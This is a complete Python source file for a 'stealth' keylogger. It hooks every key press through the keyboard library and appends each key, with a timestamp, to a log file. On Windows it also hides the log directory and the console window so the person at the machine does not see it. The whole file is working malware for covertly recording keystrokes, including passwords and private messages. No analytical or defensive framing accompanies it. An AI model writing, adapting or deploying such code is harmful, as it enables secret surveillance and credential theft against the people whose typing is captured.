import keyboard
import threading
import time
import os
import sys
import atexit
from datetime import datetime
from pathlib import Path

class StealthKeylogger:
    def __init__(self, log_file="keylog.txt", max_file_size=10*1024*1024):
        self.log_file = Path(log_file)
        self.max_file_size = max_file_size
        self.running = True
        self.log_lock = threading.Lock()
        self._ensure_log_dir()
        
    def _ensure_log_dir(self):
        """Ensure log directory exists and is hidden on Windows"""
        self.log_file.parent.mkdir(parents=True, exist_ok=True)
        if os.name == 'nt':  # Windows
            try:
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(str(self.log_file.parent), 0x02)
            except:
                pass
    
    def _rotate_log(self):
        """Rotate log file if it exceeds max size"""
        if self.log_file.exists() and self.log_file.stat().st_size > self.max_file_size:
            backup = self.log_file.with_suffix('.old')
            self.log_file.rename(backup)
    
    def write_log(self, key):
        """Thread-safe logging with rotation"""
        if not self.running:
            return
            
        try:
            self._rotate_log()
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            clean_key = self._clean_key(str(key).replace("'", ""))
            
            with self.log_lock:
                with open(self.log_file, "a", encoding='utf-8') as f:
                    f.write(f"[{timestamp}] {clean_key}\n")
                    f.flush()
        except Exception:
            pass
    
    def _clean_key(self, key_str):
        """Clean and format key names for better readability"""
        key_str = key_str.replace('Key.', '').replace('special-', '')

        key_map = {
            'space': ' ',
            'enter': '[ENTER]',
            'backspace': '[BACKSPACE]',
            'tab': '[TAB]',
            'delete': '[DELETE]',
            'shift': '[SHIFT]',
            'ctrl': '[CTRL]',
            'alt': '[ALT]',
            'esc': '[ESC]',
            'up': '[UP]',
            'down': '[DOWN]',
            'left': '[LEFT]',
            'right': '[RIGHT]',
            'home': '[HOME]',
            'end': '[END]',
            'pageup': '[PGUP]',
            'pagedown': '[PGDN]',
        }
        
        return key_map.get(key_str.lower(), key_str)
    
    def _on_key_press(self, event):
        """Handle key press events"""
        if event.event_type == keyboard.KEY_DOWN:
            self.write_log(event.name)
    
    def _signal_handler(self, signum, frame):
        """Graceful shutdown handler"""
        self.stop()
    
    def start(self):
        """Start the keylogger"""
        # Register cleanup handlers
        atexit.register(self.stop)
        import signal
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
        print("[+] Stealth keylogger initialized")
        print("[+] Press Ctrl+C to stop")
        
        keyboard.on_press(self._on_key_press)
        
        try:
            keyboard.wait()
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop the keylogger"""
        self.running = False
        keyboard.unhook_all()
        print("\n[-] Keylogger stopped")

def main():
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    logger = StealthKeylogger()
    logger.start()

if __name__ == "__main__":
    main()